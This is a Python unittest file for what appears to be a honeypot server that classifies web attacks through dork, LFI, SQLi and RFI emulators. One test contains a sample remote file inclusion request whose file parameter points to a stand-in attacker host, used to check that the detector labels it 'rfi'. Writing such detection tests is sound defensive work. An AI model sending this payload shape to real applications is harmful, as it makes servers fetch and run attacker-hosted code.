import asyncio
import unittest
import json
import server
import lfi_emulator
from unittest import mock


class TestServer(unittest.TestCase):
    def setUp(self):
        dorks = mock.Mock()
        attrs = {'choose_dorks.return_value': [x for x in range(10)], 'extract_path.return_value': mock.Mock()}
        dorks.configure_mock(**attrs)
        self.MockedRequestHandler = server.HttpRequestHandler
        with mock.patch('dorks_manager.DorksManager', mock.Mock()):
            with mock.patch('lfi_emulator.LfiEmulator', mock.Mock(), create=True):
                with mock.patch('sqli_emulator.SqliEmulator', mock.Mock(), create=True):
                    self.handler = self.MockedRequestHandler(debug=False, keep_alive=75)

        self.handler.dorks = dorks
        self.handler.writer = mock.Mock()

        @asyncio.coroutine
        def foobar(data):
            sess = mock.Mock()
            sess.set_attack_type = mock.Mock()
            return sess

        self.handler.session_manager.add_or_update_session = foobar
        # self.handler.dorks = dorks

        self.m = mock.Mock()
        self.m_eof = mock.Mock()
        self.m_eof.return_value = (lambda: (yield None))()

    def test_make_response(self):
        msg = 'test'
        content = json.loads(self.handler._make_response(msg).decode('utf-8'))
        assert_content = dict(version=1, response=dict(message=msg))
        self.assertDictEqual(content, assert_content)

    def test_handle_request_for_dorks(self):
        with mock.patch('aiohttp.Response.write', self.m, create=True):
            with mock.patch('aiohttp.Response.write_eof', self.m_eof, create=True):
                message = mock.Mock()
                message.headers = []
                message.path = '/dorks'
                message.version = (1, 1)

                asyncio.get_event_loop().run_until_complete(self.handler.handle_request(message, None))
                content = b''.join([c[1][0] for c in list(self.m.mock_calls)]).decode('utf-8')
                content = json.loads(content)

            assert_content = dict(version=1, response=dict(dorks=[x for x in range(10)]))
            self.assertDictEqual(content, assert_content)

    def test_handle_request_rfi(self):
        rand = mock.Mock()
        rand.return_value = [x for x in range(10)]
        self.handler.base_handler.emulators['rfi'].handle = mock.Mock(return_value=(lambda: (yield None))())

        with mock.patch('aiohttp.Response.write', self.m, create=True):
            with mock.patch('aiohttp.Response.write_eof', self.m_eof, create=True):
                message = mock.Mock()
                message.headers = []
                message.path = '/event'
                message.version = (1, 1)

                @asyncio.coroutine
                def foobar():
                    return b'{"method":"GET","path":"/vuln_page.php?file=http://attacker_site/malicous_page"}'

                payload = mock.Mock()
                payload.read = foobar

                asyncio.get_event_loop().run_until_complete(self.handler.handle_request(message, payload))

                content = b''.join([c[1][0] for c in list(self.m.mock_calls)]).decode('utf-8')
                content = json.loads(content)

                assert_content = dict(
                    version=1,
                    response=dict(message=dict(detection=dict(name='rfi', order=2, payload=None)))
                )

                self.assertDictEqual(content, assert_content)

    def test_hadle_request_index(self):
        rand = mock.Mock()
        rand.return_value = [x for x in range(10)]

        with mock.patch('aiohttp.Response.write', self.m, create=True):
            with mock.patch('aiohttp.Response.write_eof', self.m_eof, create=True):
                message = mock.Mock()
                message.headers = []
                message.path = '/event'
                message.version = (1, 1)

                @asyncio.coroutine
                def foobar():
                    return b'{"method":"GET","path":"/index.html"}'

                payload = mock.Mock()
                payload.read = foobar

                asyncio.get_event_loop().run_until_complete(self.handler.handle_request(message, payload))

                content = b''.join([c[1][0] for c in list(self.m.mock_calls)]).decode('utf-8')
                content = json.loads(content)

                assert_content = dict(
                    version=1,
                    response=dict(message=dict(detection=dict(name='index', order=1)))
                )

                self.assertDictEqual(content, assert_content)
